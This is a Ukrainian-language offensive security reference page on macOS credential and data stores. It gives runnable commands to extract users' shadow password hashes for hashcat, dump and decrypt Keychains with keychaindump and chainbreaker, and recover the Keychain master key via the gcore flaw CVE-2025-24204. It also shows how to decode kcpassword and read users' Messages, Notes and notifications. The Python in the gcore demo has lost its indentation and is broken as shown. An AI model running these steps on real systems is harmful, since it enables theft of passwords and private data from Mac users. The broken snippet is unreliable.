# Конфіденційні розташування macOS і цікаві демони

{{#include ../../../banners/hacktricks-training.md}}

## Паролі

### Shadow Passwords

Shadow password зберігається разом із конфігурацією користувача у plists, розташованих у **`/var/db/dslocal/nodes/Default/users/`**.\
За допомогою наведеного нижче oneliner можна вивести **всю інформацію про користувачів** (включно з інформацією про hash):
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Скрипти на кшталт цього**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) або [**цього**](https://github.com/octomagon/davegrohl.git) можна використовувати для перетворення хешу у **формат** **hashcat**.

Альтернативний однорядковий вираз, який виведе creds усіх облікових записів, що не є службовими, у форматі hashcat `-m 7100` (macOS PBKDF2-SHA512):
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Інший спосіб отримати `ShadowHashData` користувача — використати `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Цей файл **використовується лише**, коли система запущена в **однокористувацькому режимі** (тобто не дуже часто).

### Keychain Dump

Зверніть увагу, що під час використання бінарного файлу `security` для **dump розшифрованих паролів** користувачеві буде запропоновано кілька разів дозволити цю операцію.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
У сучасній macOS найцікавішими сховищами зазвичай є **`~/Library/Keychains/login.keychain-db`** і **`/Library/Keychains/System.keychain`**. Це файли на основі SQLite, але доступ до даних у відкритому вигляді все одно брокерує **`securityd`**: викрадення необробленої DB переважно надає метадані та зашифровані blobs, якщо додатково не відновити пароль користувача, `SystemKey` або master key у пам'яті.<sup>[[2]](#references)</sup>

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Судячи з цього коментаря [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760), схоже, що ці tools більше не працюють у Big Sur.

### Огляд Keychaindump

Було розроблено tool під назвою **keychaindump** для вилучення паролів із macOS keychains, але він має обмеження в новіших версіях macOS, таких як Big Sur, як зазначено в [обговоренні](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Використання **keychaindump** вимагає від attacker отримати доступ і підвищити privileges до **root**. Tool використовує той факт, що keychain за замовчуванням розблоковується під час входу користувача для зручності, дозволяючи applications отримувати до нього доступ без повторного введення пароля користувача. Однак якщо користувач вибере блокування keychain після кожного використання, **keychaindump** стає неефективним.

**Keychaindump** працює, націлюючись на конкретний process під назвою **securityd**, який Apple описує як daemon для операцій авторизації та криптографії, необхідний для доступу до keychain. Процес вилучення передбачає пошук **Master Key**, отриманого з пароля входу користувача. Цей key необхідний для читання файла keychain. Щоб знайти **Master Key**, **keychaindump** сканує memory heap процесу **securityd** за допомогою команди `vmmap`, шукаючи потенційні keys в областях, позначених як `MALLOC_TINY`. Для перевірки цих memory locations використовується така команда:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Після виявлення потенційних master keys **keychaindump** шукає в memory heaps певний шаблон (`0x0000000000000018`), який вказує на candidate для master key. Для використання цього ключа потрібні подальші кроки, зокрема deobfuscation, як описано у вихідному коді **keychaindump**. Аналітикам, які працюють у цій галузі, слід пам’ятати, що критично важливі дані для розшифрування keychain зберігаються в пам’яті процесу **securityd**. Приклад команди для запуску **keychaindump**:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) можна використовувати для криміналістично коректного вилучення таких типів інформації з keychain OSX:

- Хешований пароль keychain, придатний для злому за допомогою [hashcat](https://hashcat.net/hashcat/) або [John the Ripper](https://www.openwall.com/john/)
- Інтернет-паролі
- Загальні паролі
- Приватні ключі
- Публічні ключі
- Сертифікати X509
- Захищені нотатки
- Паролі Appleshare

Маючи пароль для розблокування keychain, майстер-ключ, отриманий за допомогою [volafox](https://github.com/n0fate/volafox) або [volatility](https://github.com/volatilityfoundation/volatility), чи файл розблокування, наприклад SystemKey, Chainbreaker також надасть паролі у відкритому вигляді.

Без одного з цих методів розблокування Keychain Chainbreaker відобразить усю іншу доступну інформацію.

#### **Дамп ключів keychain**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Dump ключів keychain (із паролями) за допомогою SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Вивантаження ключів keychain (із паролями) зі зламуванням хешу**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Отримання ключів keychain (з паролями) за допомогою дампа пам’яті**

[Виконайте ці кроки](../index.html#dumping-memory-with-osxpmem), щоб створити **дамп пам’яті**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) using users password**

Якщо ви знаєте пароль користувача, його можна використати, щоб **dump і розшифрувати keychain, що належать користувачеві**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Keychain master key via `gcore` entitlement (CVE-2025-24204)

У macOS 15.0 (Sequoia) до `/usr/bin/gcore` постачалося entitlement **`com.apple.system-task-ports.read`**, тому будь-який локальний адміністратор (або шкідливий підписаний застосунок) міг зробити dump пам'яті **будь-якого процесу, навіть за ввімкненого SIP/TCC**. Dump процесу `securityd` розкриває **Keychain master key** у відкритому вигляді та дає змогу розшифрувати `login.keychain-db` без пароля користувача.<sup>[[1]](#references)</sup>

**Швидка демонстрація на вразливих збірках (15.0–15.2):**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Передайте отриманий hex-ключ до Chainbreaker (`--key <hex>`), щоб розшифрувати login keychain. Apple видалила entitlement у **macOS 15.3+**, тому це працює лише на непатчених збірках Sequoia або системах, де зберігся вразливий binary.

### kcpassword

Файл **kcpassword** містить **пароль користувача для входу**, але лише якщо власник системи **увімкнув автоматичний вхід**. У такому разі користувач автоматично входить у систему без запиту пароля (що є досить небезпечним).

Пароль зберігається у файлі **`/etc/kcpassword`**, xored із ключем **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Якщо пароль користувача довший за ключ, ключ буде використано повторно.\
Це робить відновлення пароля досить простим, наприклад за допомогою таких скриптів, як [**цей**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Цікава інформація в базах даних

### Повідомлення
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Сповіщення

До **Sequoia** сховище Notification Center зазвичай можна знайти в **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. У **Sequoia+** Apple перемістила його до захищеного TCC групового контейнера **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**.

Більшість цікавої інформації зберігається всередині стовпців **blob**, тому потрібно буде видобути цей вміст і перетворити його на придатний для читання формат (`plutil -p -`, `strings` або невеликий parser). Приклади швидкого triage:
```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```
#### Нещодавні проблеми з приватністю (NotificationCenter DB)

- У macOS **14.7–15.1** Apple зберігала вміст банерів у SQLite `db2/db` без належного редагування. CVE **CVE-2024-44292/44293/40838/54504** дозволяли будь-якому локальному користувачу читати текст сповіщень інших користувачів, просто відкривши DB (без запиту TCC).
- Apple усунула цю проблему, перемістивши DB до `group.com.apple.usernoted` і захистивши її за допомогою TCC у новіших збірках Sequoia, тому в поточних системах для її читання зазвичай потрібен правильний контекст користувача або TCC bypass.<sup>[[3]](#references)</sup>
- У legacy endpoints скопіюйте файли `db`, `db-wal` і `db-shm` разом перед оновленням або перезавантаженням, якщо хочете зберегти артефакти.

### Нотатки

**Нотатки** користувачів можна знайти в `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```
Якщо наведений вище однорядковий вираз виводить забагато шуму, експортуйте `ZICNOTEDATA.ZDATA`, розпакуйте його за допомогою gunzip і розберіть protobuf: зазвичай це надійніше, ніж безпосередньо запускати `strings` для SQLite.

### Фонові завдання / Елементи входу

Починаючи з **Ventura**, схвалені користувачем елементи входу та кілька фонових завдань відстежуються у сховищах **BTM**, таких як **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** і кеш системи з версіями **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.

Ці файли корисні для швидкого виявлення persistence, helper tools і деяких фонових елементів, керованих MDM:
```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```
Щодо аспекту persistence та внутрішніх механізмів BTM дивіться [сторінку з auto-start locations](../../macos-auto-start-locations.md#login-items) і [нотатки Background Tasks Management](../macos-security-protections/README.md#background-tasks-management).

## Preferences

У macOS preferences розташовані в **`$HOME/Library/Preferences`**, а в iOS — у `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

У macOS cli tool **`defaults`** можна використовувати для **модифікації файлу Preferences**.

**`/usr/sbin/cfprefsd`** claims XPC services `com.apple.cfprefsd.daemon` і `com.apple.cfprefsd.agent`, і його можна викликати для виконання таких дій, як модифікація preferences.

## OpenDirectory permissions.plist

Файл `/System/Library/OpenDirectory/permissions.plist` містить permissions, застосовані до атрибутів node, і захищений SIP.\
Цей файл надає permissions конкретним користувачам за UUID (а не uid), щоб вони могли отримувати доступ до певної sensitive information, як-от `ShadowHashData`, `HeimdalSRPKey` і `KerberosKeys`, серед іншого:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## Системні сповіщення

### Сповіщення Darwin

Основним daemon для сповіщень є **`/usr/sbin/notifyd`**. Щоб отримувати сповіщення, клієнти повинні зареєструватися через Mach port `com.apple.system.notification_center` (перевірте їх за допомогою `sudo lsmp -p <pid notifyd>`). Daemon можна налаштувати за допомогою файлу `/etc/notify.conf`.

Назви, що використовуються для сповіщень, є унікальними нотаціями зворотного DNS, і коли сповіщення надсилається на одну з них, його отримають клієнти, які вказали, що можуть його обробити.

Можна вивести поточний стан (і переглянути всі назви), надіславши сигнал SIGUSR2 процесу notifyd і прочитавши створений файл: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

**Distributed Notification Center**, основним бінарним файлом якого є **`/usr/sbin/distnoted`**, — це ще один спосіб надсилати сповіщення. Він надає деякі XPC-сервіси та виконує певні перевірки, щоб спробувати перевірити клієнтів.

### Apple Push Notifications (APN)

У цьому випадку застосунки можуть реєструватися для **topics**. Клієнт генерує токен, зв'язуючись із серверами Apple через **`apsd`**.\
Потім providers також генерують токен і можуть підключатися до серверів Apple, щоб надсилати повідомлення клієнтам. Ці повідомлення локально отримує **`apsd`**, який передає сповіщення застосунку, що очікує на нього.

Налаштування розташовані в `/Library/Preferences/com.apple.apsd.plist`.

Локальна база даних повідомлень у macOS розташована в `/Library/Application\ Support/ApplePushService/aps.db`, а в iOS — у `/var/mobile/Library/ApplePushService`. Вона містить 3 таблиці: `incoming_messages`, `outgoing_messages` і `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Також можна отримати інформацію про daemon і підключення за допомогою:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Сповіщення користувача

Це сповіщення, які користувач має бачити на екрані:

- **`CFUserNotification`**: Цей API дає змогу показувати на екрані спливне вікно з повідомленням.
- **The Bulletin Board**: В iOS це показує банер, який зникає та зберігається в Центрі сповіщень.
- **`NSUserNotificationCenter`**: Це Bulletin Board в iOS для macOS. У старіших випусках macOS база даних зазвичай розташована в `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; у Sequoia+ її було переміщено до `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.

## Посилання

- [1] [HelpNetSecurity – entitlement macOS gcore дозволив вилучення головного ключа Keychain (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [2] [Apple Platform Security – захист даних Keychain](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [3] [9to5Mac – Apple усунула проблеми конфіденційності щодо бази даних Центру сповіщень у macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)

{{#include ../../../banners/hacktricks-training.md}}
